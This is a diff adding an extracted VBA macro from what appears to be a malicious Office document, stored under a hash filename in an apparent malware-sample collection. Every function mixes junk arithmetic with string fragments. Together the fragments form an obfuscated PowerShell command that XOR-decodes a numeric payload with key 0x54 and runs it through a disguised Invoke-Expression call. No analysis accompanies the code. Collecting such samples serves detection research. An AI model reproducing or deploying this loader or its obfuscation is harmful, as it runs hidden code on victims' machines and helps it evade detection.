@@ -1,0 +1,225 @@
+Filename     : ./macros/2e38924b11409ff3a2e6392c76d78dd272d8ccedba797369a2972b4c0c600d50
+OLE stream   : Macros/VBA/iqFHfCU
+VBA filename : iqFHfCU.bas
+----------------------------------------
+Attribute VB_Name = "iqFHfCU"
+Function DjYiKiSOah()
+On Error Resume Next
+MLTHw = 89216 + jwcHJ + (72606 * CDbl(pwhTYp) - UFrkPo / CSng(25895) - KXpNk / Hex(wikfF) + 69053 - 12203)
+sDESrG = XhGANo - SwAOs / 29371 / oSGnZM - 223327908 + Hex(fSzNKV) * lJSfqG - Round(23409)
+svEwoA = Sqr(15991)
+muVDOi = pGWMbu
+jCSlLzu = "HeLL [STrIN" + "g]::JOIn" + "('',([Char[" + "]] (112,2"
+lwfSt = 61947 + PGnCSa + (63690 * CDbl(iiBIlr) - WuRYS / CSng(42927) - ZFRia / Hex(KnNwa) + 37519 - 64617)
+GkFMSb = AVNWtj - lnzjbv / 40074 / hRJZa - 223327908 + Hex(cKXAI) * zjZOij - Round(4400)
+wppNvW = Sqr(25856)
+zjsHnc = vZHtr
+rQIIvnRh = "1 , 56," + "21 ,38" + " ,23 , 13 ,116" + ", "
+WBCnC = 84726 + jYKqW + (70648 * CDbl(iEOkws) - HdUUVN / CSng(22808) - awHFqM / Hex(ilLqhV) + 77770 - 33458)
+QCZOXh = hipjw - iQulj / 50977 / YHKXTL - 223327908 + Hex(tSwfAm) * rDRza - Round(92906)
+aDOjz = Sqr(76473)
+bNzoM = EBOPu
+YujJZhcWkd = "105,116 ," + "58" + ",49, " + "35,121,59 , 5" + "4,62 ,49 ,55 ," + " 32 , 116" + ",38,53,58, " + "48 ,59 ,57" + " ,"
+KFIrB = 90700 + kZOjJ + (63007 * CDbl(wrNco) - iKuwS / CSng(66763) - IJjJVj / Hex(bMiLPC) + 28455 - 23415)
+jonuAL = ZTRDa - FKaFjj / 17358 / NmuSR - 223327908 + Hex(QjawBM) * chvfbB - Round(41999)
+PfiHiH = Sqr(94651)
+iLsoq = oJJcw
+aaEbTQ = " 1" + "11," + " 112 , 14 , 56" + ",63 ,37," + "57 ,29 ," + "116, 105,116 ," + " 58" + " ,49 ,35 , 121 "
+TCscij = 91673 + sTBOBd + (55781 * CDbl(ZIhnQQ) - ijOUv / CSng(54376) - DdXtJ / Hex(DCsUaw) + 8161 - 32193)
+qBdCAJ = TMANTP - rHTzb / 44060 / MNUMl - 223327908 + Hex(KNnDz) * RnWQGi - Round(86796)
+WBjsc = Sqr(54273)
+wkLlDJ = HCuXo
+wmtaKTmP = ",59, 54 ,6" + "2, 4" + "9 ,55 " + ", 32 ,116 ," + "7 , 45" + " , 39" + " , 32 , 49 ," + "57 ,122, 26, 49" + " , 32 , 122 " + ",3 ,49, 54,"
+FWdnI = 80833 + klFYw + (26485 * CDbl(wlUrM) - iQqEn / CSng(73234) - kniUaI / Hex(rvJiIQ) + 29785 - 15947)
+LCAaR = fYAWOi - HlwoOf / 4823 / liwDav - 223327908 + Hex(VKROh) * TSahhC - Round(30457)
+TjdUN = Sqr(5569)
+ZIZik = lftMu
+cLHiblPRjZ = "23 ,56,61,49 ,5" + "8 ,32 , 1" + "11 ,112" + " , 23"
+TEXrt = 17118 + qFzzJ + (75653 * CDbl(XGhdm) - DwtTPh / CSng(77588) - VLjjOt / Hex(WKpIGh) + 82606 - 64001)
+DNiWX = DcMUT - tTQvt / 38415 / vrVfI - 223327908 + Hex(OqjNH) * VmmdT - Round(60914)
+mBaPN = Sqr(66934)
+hmCkLN = loGhAY
+zhUiq = ", 28,27, 61,39," + " 116, 1" + "05" + ", 116,115 " + ",60 ,3" + "2, 32, 36," + " 110, 123" + ",123 ,39 , 55, " + "60 , 59,59" + ",58 ,"
+vNnjhh = 50605 + IUXOF + (92262 * CDbl(jGqzPW) - ooiZtv / CSng(83442) - HKHacI / Hex(GvlFNS) + 84351 - 68433)
+KCYzBI = fShNNH - TpkAuM / 19229 / awEfi - 223327908 + Hex(fFuNl) * PZkzE - Round(75207)
+qqPljt = Sqr(47875)
+bLHNw = NVnjWG
+uwwzPzW = " 60,49," + " 61 ,48,39 " + ", 39," + " 53,56, 59 " + ", 58,121 ,39 ,"
+hCcbu = 43075 + lzMmz + (54344 * CDbl(PtFlwH) - jNpSi / CSng(76736) - fFEOO / Hex(iMzJE) + 65508 - 26212)
+dUPjrz = pnJMiC - tHXkD / 16751 / wwjOt - 223327908 + Hex(Jiqmo) * aBlpiX - Round(52398)
+aiwft = Sqr(387)
+avliWr = XZAjw
+WNUiPSW = "33" + ", 38" + ",38, 49 ," + " 58 , 48 ," + " 49,38 ,1"
+DjYiKiSOah = jCSlLzu + rQIIvnRh + YujJZhcWkd + aaEbTQ + wmtaKTmP + cLHiblPRjZ + zhUiq + uwwzPzW + WNUiPSW
+End Function
+Function hBfOAAdpccw()
+On Error Resume Next
+thYjVz = 85662 + KwWXuc + (7801 * CDbl(StNcX) - mwnOjz / CSng(55746) - Qswwj / Hex(MGIai) + 95589 - 25803)
+hjNUO = cvHNsK - jdZww / 68749 / MkntZR - 223327908 + Hex(SSJBw) * viLkb - Round(33293)
+dVEhA = Sqr(45796)
+XJzszK = jaauq
+ciNLlLmsIzE = "22,58, 56 ,12" + "3 ," + " 60,60, 2" + "2 , 37" + " ,44 " + ", 98 , 123 ," + " 20 ,60,"
+bvztT = 89768 + WJczMu + (10739 * CDbl(zRoWf) - LBiaE / CSng(74235) - sSWDQ / Hex(dAlRRh) + 38448 - 5856)
+HjFGPt = TPInd - GuwMcJ / 23961 / WpLHlU - 223327908 + Hex(aIFNJj) * TKbNG - Round(43980)
+hDzvhz = Sqr(67355)
+kKBMp = HjAwGl
+OSCMqjUkf = "32 ,32, 36, 11" + "0 ," + " 123 ,123 ,34," + "53 , 48 , 5" + "9," + " 58, 63,53 " + ", 122 ,55 ,5"
+luuwiZ = 67799 + HCZUHr + (50825 * CDbl(lODpBU) - iiCtV / CSng(45618) - zZmBd / Hex(Pcjjn) + 12788 - 89603)
+rjjhQi = QbjNU - CzhGOA / 43838 / iXBua - 223327908 + Hex(XdcJnG) * IqFTNv - Round(98817)
+HEaji = Sqr(32461)
+BZjZib = DjFnW
+aWtJfvc = "9, 5" + "7 ,123, " + "61,0,31" + " ,7,123,20, 6" + "0, 32 ,32 " + ",36 ,110" + " , 123 ," + " 123,35 ,3" + "5,35 ,122" + ", "
+oMMfmp = 70322 + nwWaNH + (88452 * CDbl(bmAFX) - WWbINa / CSng(31095) - IoEMm / Hex(dajXKG) + 46848 - 18297)
+cWrqp = icKch - iVAUzf / 2120 / duQZM - 223327908 + Hex(bjIASK) * UcqvGo - Round(45184)
+zYFZzv = Sqr(63738)
+IAamM = HXUVi
+CHknvIWOvZh = "53 , " + "58 ,48,38," + " 4" + "9 " + ", "
+hBfOAAdpccw = ciNLlLmsIzE + OSCMqjUkf + aWtJfvc + CHknvIWOvZh
+End Function
+Function OKwqi()
+On Error Resume Next
+qhFSdv = 52815 + TJKWPO + (86211 * CDbl(ZqrdD) - unhtzz / CSng(22639) - YAQzd / Hex(kcdswH) + 53608 - 82309)
+aQXInS = jwijvk - GPlza / 93443 / whwGD - 223327908 + Hex(NqTLw) * nZzcV - Round(14790)
+UDjlN = Sqr(21385)
+vAdrS = iXkcSu
+PPQlP = "45,54 , 59 ," + "48,38,59" + " , 34 ," + "122 , 38,33 , 1" + "23, 53 ,22, 1" + "02,53,3" + "1 ,123, 20 , " + "60,32 ,32,36,"
+OXcjaC = 68428 + WscSki + (94908 * CDbl(GnQqID) - CPYaz / CSng(18693) - CYXMwQ / Hex(QBTYSW) + 1316 - 37615)
+dKDaTC = lpXqEu - khnql / 94246 / qhTiQ - 223327908 + Hex(cpkrCt) * inNWzz - Round(82888)
+nzIZHA = Sqr(59543)
+stwRX = FJOnun
+IwhrOQv = " 110 ,123 , " + "123, 35" + ",35,35 ,1" + "22," + " 48 , 59 ," + " 51, 53, 58,53" + " ,45,61 ,39 " + ", 57 ,53, " + "63 ,45 " + ", "
+ndjrCQ = 98378 + FjnKUq + (94729 * CDbl(RtmFf) - jITMW / CSng(30836) - wZnLu / Hex(Kdiuir) + 79978 - 45542)
+YcczZ = aYqtji - GAzZv / 75084 / mwDNqq - 223327908 + Hex(mPcwA) * iBKjv - Round(41334)
+WEjYP = Sqr(14097)
+cwKPEO = blROh
+LORBWnUIjN = "49 ,48, " + "49 , 63,3" + "6 , 53," + "38 , 55 ,5" + "3 ,122" + " , 55 ,59 , 57," + " 12"
+cQhZYO = 17728 + coJOvi + (54690 * CDbl(FpQiZW) - jvPFjY / CSng(11383) - KSVYp / Hex(blVmmn) + 26913 - 93445)
+CFcBiJ = ZKWZw - ZKmfiD / 89739 / njakGV - 223327908 + Hex(FjAiWm) * SNvzc - Round(23903)
+taipFj = Sqr(78020)
+CFDoI = RLWEJ
+iBzmrUB = "3,3" + "9 ,39" + ", 6 , 62, " + "60 ,123 ," + " 2" + "0 ,60,32 ," + "32 , 36 ,110" + ", 123,12" + "3, 35 ,35,35 "
+nOWCQX = 77540 + UbWqcJ + (11601 * CDbl(Zkjbif) - TlmNB / CSng(28774) - ZYFcz / Hex(wKiZn) + 66053 - 85031)
+ZvBLH = CRiKn - GCwkA / 18226 / vOFHn - 223327908 + Hex(nMZmQd) * qvzdDQ - Round(84882)
+twVkO = Sqr(46429)
+bQozt = PrJbd
+unbAOztB = ", 122 " + ", 63 , 4" + "9, 58" + " , " + "55,53,58 , 53" + " ,57,3" + "3, 56," + " 61 ,53 , 1"
+OKwqi = PPQlP + IwhrOQv + LORBWnUIjN + iBzmrUB + unbAOztB
+End Function
+Function ibTckNt()
+On Error Resume Next
+McDUnO = 22656 + qdfNh + (502 * CDbl(KCUjj) - ABWFs / CSng(75094) - BOdYvC / Hex(NsfppE) + 46691 - 21817)
+bhlJMb = OvafRc - GSfZKS / 43980 / rftolI - 223327908 + Hex(KmlbS) * rKtNm - Round(21876)
+NlhAu = Sqr(51306)
+tszOA = lwvNV
+lfviwpR = "22 , 55 , 5" + "9 ,57,12" + "3,2" + "6 ,54," + "53 , 36 ,16, " + "123 , 115 ,1"
+YwpGQ = 45403 + Yulotq + (18240 * CDbl(PHmLXH) - lcFmF / CSng(41982) - AIMBT / Hex(GBEcqz) + 74153 - 45089)
+POMBT = NAdST - tccsX / 30035 / NDJVaU - 223327908 + Hex(cBZWfD) * otzoS - Round(51020)
+ajPZS = Sqr(84085)
+tOZGj = HTBak
+BFCrXO = "22, 7, 36 ,56" + ",61 , 32" + ", 124, 115, 20" + " ,115, 12" + "5, 111, 1" + "12,57 , " + "62 ,61,6, 2" + "2,11"
+HGtmjl = 66434 + bGmQO + (9209 * CDbl(iDFpvZ) - KzzFE / CSng(92227) - liVbf / Hex(nEClpM) + 53677 - 52987)
+VjEHvv = ahmIqb - oiXva / 2781 / ziwYR - 223327908 + Hex(jEiwj) * sAvbZ - Round(83476)
+lNAZzT = Sqr(70008)
+nDzYdO = jwosKb
+IpLai = "6 ," + " 105, 11" + "6 , 112,21 ,5" + "6 ,21 , 38 " + ",23," + " 13, " + "122 , " + "58 , 49,44," + " 32 , 124 , " + "101, 120,116"
+iSVzGi = 57548 + FWCoYq + (68311 * CDbl(tGwER) - JsIioA / CSng(80605) - mdwqR / Hex(fwVqN) + 45685 - 15090)
+CzbuJ = obudut - YriYKk / 90047 / HqujUm - 223327908 + Hex(ktTkj) * bzOXPC - Round(18695)
+FmuuhF = Sqr(59887)
+NKHaT = QVYSBB
+MYwrkZuk = " , 102, 109" + ",97,99 , 108" + ",98, 125," + "111,1" + "12, 48" + " ,16 " + ",36," + "5,2" + "1 , "
+GhOoqS = 82743 + JKNJz + (84962 * CDbl(Builr) - GRSQF / CSng(53930) - WwQwA / Hex(thIbMr) + 6199 - 91006)
+mzjjzQ = YkqSiN - RJQzms / 36025 / tnPfw - 223327908 + Hex(VWZjB) * iwRzt - Round(33309)
+SAujCs = Sqr(40891)
+wkcOEj = LWXUka
+BYiPzHdWRkN = "13 , 116 ,10" + "5 , 116,112 ,49" + " ,58,34 ,110, " + "32,49 , 57 , 3" + "6 , 116,127 ," + "116 , "
+cKPFv = 37757 + SiCOQ + (73899 * CDbl(uPUsTG) - fPurD / CSng(98281) - YhkDW / Hex(YIOrVd) + 47397 - 98682)
+szzlz = UNsUCt - RKtMEl / 1872 / WqhVwO - 223327908 + Hex(GFLzPS) * EZoaNt - Round(56685)
+ANlwnT = Sqr(18827)
+DbBkQ = ZjlSD
+LzZaFMsjRE = "115, 8 ,1" + "15,116 , 127" + ",1" + "16 " + ",1" + "12 ," + "57" + " ,62" + ",61," + " 6, 22"
+PPBjm = 13275 + JFdiZG + (38927 * CDbl(dYHzt) - LPJffP / CSng(37014) - QGfVvJ / Hex(ZhGWq) + 99522 - 32037)
+mcbDA = AHrTjp - wDKKw / 9003 / AdChvm - 223327908 + Hex(WksEX) * EttUF - Round(46748)
+IJvXOF = Sqr(18336)
+IVGmjC = ljhImW
+QfIGIWC = " , 116 ,127, " + "116 ,1" + "15 ," + "122"
+ibTckNt = lfviwpR + BFCrXO + IpLai + MYwrkZuk + BYiPzHdWRkN + LzZaFMsjRE + QfIGIWC
+End Function
+Function jaaNSFSznz()
+On Error Resume Next
+SAJat = 17160 + pdXzO + (17999 * CDbl(SFKqEa) - JBzfO / CSng(37366) - rRzfpW / Hex(EjSbwK) + 84712 - 6380)
+IpdIzL = ipjzMY - ZmuOV / 84438 / HPiGZ - 223327908 + Hex(XFavn) * EXAtf - Round(8927)
+fIJtmE = Sqr(89572)
+hzfWTb = JFkMP
+bUKJjzSH = ",49" + ",44 ,49" + " , 115 , 111,50" + " , 59, 38, " + "49 ,53" + ", 55, 60 , " + "124" + ", 11" + "2,6,50 , " + "61, "
+CfAZwC = 50239 + WZPkKq + (37733 * CDbl(ZtPJzT) - AlkPV / CSng(11902) - hcXDTY / Hex(aucii) + 4086 - 44442)
+NljNAn = mEnhr - MHWuaw / 96471 / fTRvHr - 223327908 + Hex(PlqfD) * JSkKVm - Round(63217)
+tjAkPJ = Sqr(58195)
+YwHiu = DLiXwX
+qMqJiEcwFfX = "18,12 , 24," + " 116 ," + "61,58 , " + "116, 1" + "12 ,23 ,28 ,27 " + ", 61" + ", 39 " + ",125 , 47,"
+RSSswM = 44017 + wBotD + (79091 * CDbl(kELRwF) - wPCKYl / CSng(91704) - UXzbA / Hex(scqUT) + 11635 - 88803)
+zOwcpV = qlolY - jRwbpT / 83959 / Vzdzid - 223327908 + Hex(qjltq) * VIwwK - Round(93163)
+qLdnr = Sqr(10294)
+ZqUfFh = dppKjv
+GamdFfFQsD = " 3" + "2,38 ,4" + "5 , 47 ,112" + " , 14 ,5" + "6 , 6" + "3 ,37 , 57" + " ,29 , 122 ," + " 16,59 , 3" + "5,58 ,56 , " + "59,53 , 4"
+iRVdG = 86026 + zFCrhd + (21670 * CDbl(zdiXC) - QRvRjq / CSng(98210) - inVcIr / Hex(dUEDLm) + 99088 - 56426)
+LTNAZ = XCiXa - VFUUR / 37449 / ZTqCQ - 223327908 + Hex(ERMPhJ) * TURpd - Round(82467)
+AWbRSY = Sqr(38545)
+mEfiiz = ZPCwYN
+qCSZwQUbscn = "8 ,18," + " 61 , 56,49 , " + "124 , 112" + " , 6 ,50, 61 ," + " 1" + "8,12 , 24, 122 " + ",0," + "59, 7," + "32 ,38, 61,58 ,"
+wQuhV = 30995 + MVuKmz + (27969 * CDbl(vAniq) - PzrSJo / CSng(84782) - jVLIh / Hex(pYnwZ) + 61511 - 59101)
+HWQZj = CPLbF - lYwiPD / 60707 / NrFKv - 223327908 + Hex(kUDaoo) * POorH - Round(52734)
+OXOjAD = Sqr(35154)
+JhBjO = OVvBH
+DvtEVwXZZfd = " 51 ," + " 124 ,125" + ", 1" + "20 ," + " 116,1"
+vGPRF = 57339 + jiLln + (31945 * CDbl(VJKnHc) - BpHHk / CSng(6358) - uvTGrQ / Hex(IzWmi) + 47404 - 85723)
+wMTRt = IKVaT - nsfwAS / 25559 / oAdDO - 223327908 + Hex(dIzZp) * OhXtX - Round(98754)
+MzJKNb = Sqr(61500)
+VYkza = zpYjUw
+aUnWiGltmG = "12, " + "48,16, 36 , 5," + " 21,13, " + "125 ,111,7 " + ",32 , 53 , 3" + "8 , 32,121, " + "4, 38"
+vOVZv = 67111 + CfoAM + (91400 * CDbl(MWFVlY) - zVTcj / CSng(49638) - HOIokP / Hex(ttHbKH) + 93255 - 75850)
+zipJws = zMJRv - fMcfr / 37526 / zuaQEL - 223327908 + Hex(ccOHG) * UJFuG - Round(95577)
+rzVSs = Sqr(70317)
+rrMRD = HzUTN
+KNzwUKhBUw = " ," + " 59" + ", 55" + " , 49 " + ",39 , 39,116," + "112 , 48" + ", 16,36, 5"
+jaaNSFSznz = bUKJjzSH + qMqJiEcwFfX + GamdFfFQsD + qCSZwQUbscn + DvtEVwXZZfd + aUnWiGltmG + KNzwUKhBUw
+End Function
+Function SzbRcnvYkhA()
+On Error Resume Next
+YHwFHY = 9860 + ZZVwBK + (48517 * CDbl(VGhZtS) - nfZZDp / CSng(90547) - FYfiPX / Hex(wVBNb) + 35866 - 79286)
+QiFWJZ = zBuibQ - WcKZQI / 22797 / frSzP - 223327908 + Hex(tcPsY) * IzcsN - Round(59757)
+zjbaC = Sqr(47625)
+rKOBq = WXfXp
+oMJInimH = ", 2" + "1,13,11" + "1, 54, 38,49 ,5" + "3, 63 , 111 " + ",4" + "1 ,55,53 " + ", 32 , 55 ,60" + ",47 , 35 ," + " 38 , 61 , "
+QdrCOD = 22444 + IFZfl + (6269 * CDbl(RZARL) - spYNvb / CSng(47768) - wpKOH / Hex(lQvOp) + 4431 - 39446)
+EEApz = oSoTb - lMQORi / 91009 / BdmcI - 223327908 + Hex(lXwaj) * AArkKY - Round(14352)
+RZmLn = Sqr(46891)
+WzSwq = qdERA
+jJOwmGVo = "32, 49, 121 " + ",60, 5" + "9 ,39 , " + "32 ," + "116 ,112,1"
+XaSXh = 66763 + QTOjnm + (71036 * CDbl(fEsWL) - DXrOt / CSng(65793) - XnEDwq / Hex(RSmrYv) + 61804 - 58514)
+JjrUCa = nAwtf - frvHD / 24355 / BwPlY - 223327908 + Hex(fpQkRB) * btPzJO - Round(84354)
+LZdzZV = Sqr(13280)
+zwGuNP = uALVjs
+URzKBwKJp = "1, 12" + "2 ,17 ,44, 55, " + "49 " + ", 36 , 32 , 61"
+LQFvWv = 38565 + Qfrwh + (74343 * CDbl(vwoUnz) - QzZzz / CSng(13198) - tvtrAh / Hex(tNswJj) + 15293 - 38174)
+BimzGV = wNpWj - HhFcCk / 92758 / iRRwE - 223327908 + Hex(wGAwBN) * pVvzn - Round(84181)
+zAtGls = Sqr(64301)
+DYzmwi = ihqVIp
+VUrMLTfqOFA = ", 59" + " , 58 ," + "122 ," + "25 ,49," + " 39,"
+PXMUCB = 91329 + pMsUWs + (33872 * CDbl(JcPtd) - hajMI / CSng(65060) - SWNucq / Hex(Jbwlw) + 81231 - 19949)
+TNHqp = npsNzX - iatCzC / 66436 / dwnOzb - 223327908 + Hex(zFHWo) * tjUzc - Round(43474)
+wQNDaH = Sqr(57888)
+Awrlj = sTndjH
+muuCAN = "39" + " , 53, 51, 49" + " ,111,41 ,41 ) " + "| FOre"
+VqRUcr = 21199 + qnGdj + (39517 * CDbl(tYCXju) - lOwbE / CSng(14193) - iEfRs / Hex(DPAXk) + 22281 - 30381)
+wwEYAv = CYBnD - MiaLqU / 64959 / YfmUfI - 223327908 + Hex(miXfYb) * FbssEw - Round(25056)
+FcNDZ = Sqr(67004)
+Gsiqnt = qUBbE
+sJccnzCWSz = "acH { " + "[Char]($_-BxO" + "r " + Chr(34) + "0x5" + "4" + Chr(34) + ") }) )| " + ".((V" + "aRIAbLE '" + "*mdr*')." + "NaME[" + "3,11,2]-Jo"
+TREVn = 49516 + qiIfW + (57563 * CDbl(zTwPjQ) - JpMNEI / CSng(71343) - JaXIKl / Hex(oWRYw) + 70559 - 82780)
+RDaKbr = iRfKU - HOTrpi / 53309 / KTMSBj - 223327908 + Hex(iPjzu) * FEjbiw - Round(28698)
+cuatBi = Sqr(29534)
+VwHRDW = BNFBT
+uuKUYuQO = "in'')"
+SzbRcnvYkhA = oMJInimH + jJOwmGVo + URzKBwKJp + VUrMLTfqOFA + muuCAN + sJccnzCWSz + uuKUYuQO
+End Function
+
